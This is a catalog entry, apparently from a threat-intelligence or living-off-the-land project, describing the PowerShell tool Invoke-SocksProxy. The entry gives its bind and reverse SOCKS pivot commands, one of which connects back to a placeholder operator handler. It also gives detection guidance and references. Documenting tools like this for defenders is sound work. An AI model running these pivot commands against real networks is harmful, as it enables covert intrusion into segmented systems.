---
Name: Invoke-SocksProxy
Description: Invoke-SocksProxy is a self-hosted PowerShell module that creates a SOCKS 4/5 proxy on a compromised Windows host, or a reverse SOCKS proxy that initiates outbound SSL connections back to an operator-run handler and exposes the tunnel as a SOCKS proxy on the handler side for pivoting. Being a script run in memory with an operator-controlled handler, there is no vendor domain to block. It is abused for pivoting into segmented networks, observed in a CISA-reported federal agency compromise, among others.
Author: cyberbuff
Created: 2026-09-22
Commands:
    - Command: Invoke-SocksProxy -bindPort 1080
      Description: Starts a local SOCKS 4/5 proxy on the compromised Windows host, listening on the given port for the operator to route traffic through.
      Usecase: Opening a SOCKS pivot on a compromised host reachable by the operator.
      Category: Access
      Privileges: User
      OperatingSystem: Windows

    - Command: Invoke-ReverseSocksProxy -remoteHost <HANDLER> -remotePort 443
      Description: Runs a reverse SOCKS proxy that connects back over SSL to the operator's handler (ReverseSocksProxyHandler.py), which then exposes a SOCKS proxy locally for pivoting into the target network; -useSystemProxy routes via the system proxy.
      Usecase: Establishing a SOCKS pivot from a compromised host that cannot accept inbound connections.
      Category: Access
      Privileges: User
      OperatingSystem: Windows
Custom_Domain_Supported: True
Full_Path:
    - Path: Invoke-SocksProxy.psm1 imported/executed in PowerShell on the compromised Windows host, with ReverseSocksProxyHandler.py run on the operator's handler for reverse mode.
Detection:
    - Command: "PowerShell execution of Invoke-SocksProxy or Invoke-ReverseSocksProxy (e.g. with -bindPort, or -remoteHost/-remotePort), and the ReverseSocksProxyHandler.py handler listening on the operator host."
Resources:
    - Link: https://github.com/p3nt4/Invoke-SocksProxy
    - Link: https://www.cisa.gov/news-events/analysis-reports/ar20-268a
---
